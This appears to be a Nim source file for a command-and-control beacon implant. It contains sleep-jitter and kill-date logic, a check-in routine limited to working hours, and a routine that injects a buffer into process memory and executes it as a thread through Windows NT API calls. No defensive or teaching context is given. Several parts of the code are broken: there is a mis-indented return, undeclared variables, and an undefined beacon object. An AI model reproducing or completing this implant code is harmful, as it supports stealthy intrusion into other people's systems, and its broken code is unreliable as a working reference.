import os, times, random
import sequtils

proc randomSleep*(minSec: int, maxSec: int) =
  let diff = maxSec - minSec
  let randVal = rand(diff) + minSec
  sleep(randVal * 1000)

proc genID*: string =
  let chars = "abcdef0123456789"
  var s = ""
  for i in 0 ..< 16:
    s &= chars[rand(chars.len-1)]
  result = s

proc hexToBytes*(hex: string): seq[byte] =
  ## Convert hex string into bytes
  result = newSeq[byte](hex.len div 2)
  for i in 0 ..< result.len:
    result[i] = parseHexInt(hex[i*2 .. i*2+1]).byte

proc calculateSleep*(): int =
  let jitterFactor = (rand(200) - 100) / 100.0  # -1.0 to +1.0
  let variance = (beacon.jitter.float / 100.0) * jitterFactor
  result = int(beacon.sleepTime.float * (1.0 + variance))

proc shouldCheckIn*(): bool =
  ## Check if beacon should actually check in
  ## Respect working hours, kill date, etc.
  # Check kill date

  if now() > beacon.killDate:
    quit(0) 

  # Check working hours (optional)
  let currentHour = now().hour
  if currentHour < 8 or currentHour >= 18:
  return false
  if now().weekday in {dMon, dTue, dWed, dThu, dFri}:
    return true
  return false

proc execProcess(cmd: string): string =
    oldProtect: DWORD
    RegionSize: PSIZE_T
    memory_handle: LPVOID
    thread_ID: LPDWORD
    pid: DWORD = GetCurrentProcessID()
    var cmd_stub:  LPVOID = VirtualAlloc(NULL,cast[SIZE_T](cmd.len),(MEM_RESERVE | MEM_COMMIT),PAGE_READWRITE)
    copyMem(cmd_stub,addr cmd[0],cmd.len)
    discard VirtualProtect(cmd_stub,cast[SIZE_T](cmd.len),PAGE_EXECUTE_READ,addr oldProtect)
    process_handle: HANDLE = OpenProcess(PROCESS_CREATE_THREAD or PROCESS_VM_OPERATION or PROCESS_VM_WRITE or PROCESS_VM_READ or PROCESS_QUERY_INFORMATION,false,pid)
    discard NtAllocateVirtualMemory(process_handle,memory_handle,NULL,addr RegionSize,(MEM_RESERVE | MEM_COMMIT),PAGE_READWRITE)
    discard NtWriteVirtualMemory(process_handle,memory_handle,cmd_stub,cast[SIZE_T](cmd.len),NULL)
    thread_handle: HANDLE = NtCreateThreadEx(process_handle,NULL,0,cast[LPTHREAD_START_ROUTINE](memory_handle),NULL,0,0,addr thread_ID) #have a play here with thread suspend and resume

    if (thread_handle == nil):
        echo "Thread Didnt run due to some error"
    
    WaitForSingleObject(thread_handle,INFINITE)
    
    CloseHandle(process_handle)
    CloseHandle(thread_handle)